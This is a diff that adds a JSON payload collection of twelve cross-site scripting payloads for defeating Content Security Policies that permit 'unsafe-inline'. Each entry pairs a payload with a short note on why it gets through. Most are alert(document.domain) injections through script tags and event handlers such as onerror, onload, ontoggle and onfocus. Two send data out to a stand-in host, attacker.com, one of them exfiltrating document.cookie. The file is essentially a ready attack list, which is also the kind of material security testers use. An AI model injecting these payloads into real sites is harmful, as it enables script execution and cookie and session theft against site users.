@@ -1,0 +1,116 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "unsafe_inline",
+  "description": "Payloads for CSPs with 'unsafe-inline' in script-src — direct inline script execution",
+  "count": 12,
+  "payloads": [
+    {
+      "id": "csp-inline-001",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<script>alert(document.domain)</script>",
+      "description": "Basic inline script — works when unsafe-inline is set",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows arbitrary inline scripts"
+    },
+    {
+      "id": "csp-inline-002",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "description": "Event handler — unsafe-inline permits on* attributes",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows event handler attributes"
+    },
+    {
+      "id": "csp-inline-003",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<svg onload=alert(document.domain)>",
+      "description": "SVG onload — inline event handler",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows SVG event handlers"
+    },
+    {
+      "id": "csp-inline-004",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<body onload=alert(document.domain)>",
+      "description": "Body onload — inline event handler",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows body event handlers"
+    },
+    {
+      "id": "csp-inline-005",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<input onfocus=alert(document.domain) autofocus>",
+      "description": "Autofocus + onfocus — no user interaction needed",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows input event handlers"
+    },
+    {
+      "id": "csp-inline-006",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<details open ontoggle=alert(document.domain)>",
+      "description": "Details ontoggle — auto-fires on open",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows details event handlers"
+    },
+    {
+      "id": "csp-inline-007",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<marquee onstart=alert(document.domain)>",
+      "description": "Marquee onstart — legacy element, often not filtered",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows legacy element handlers"
+    },
+    {
+      "id": "csp-inline-008",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<video><source onerror=alert(document.domain)>",
+      "description": "Video source onerror — nested element handler",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows nested media event handlers"
+    },
+    {
+      "id": "csp-inline-009",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<script>fetch(`//${document.domain}.attacker.com`)</script>",
+      "description": "Inline fetch exfiltration — demonstrates data theft",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows fetch-based exfiltration"
+    },
+    {
+      "id": "csp-inline-010",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<script>new Image().src='//attacker.com/?c='+document.cookie</script>",
+      "description": "Cookie exfiltration via Image — classic unsafe-inline abuse",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows image-based exfiltration"
+    },
+    {
+      "id": "csp-inline-011",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<div onpointerover=alert(document.domain)>hover</div>",
+      "description": "Pointer event handler — modern event, often unfiltered",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline allows pointer event handlers"
+    },
+    {
+      "id": "csp-inline-012",
+      "category": "csp_bypass",
+      "subcategory": "unsafe_inline",
+      "payload": "<iframe srcdoc='<script>alert(document.domain)</script>'>",
+      "description": "srcdoc iframe — inline HTML execution context",
+      "technique": "unsafe_inline",
+      "csp_bypass": "unsafe-inline + srcdoc creates new inline execution context"
+    }
+  ]
+}
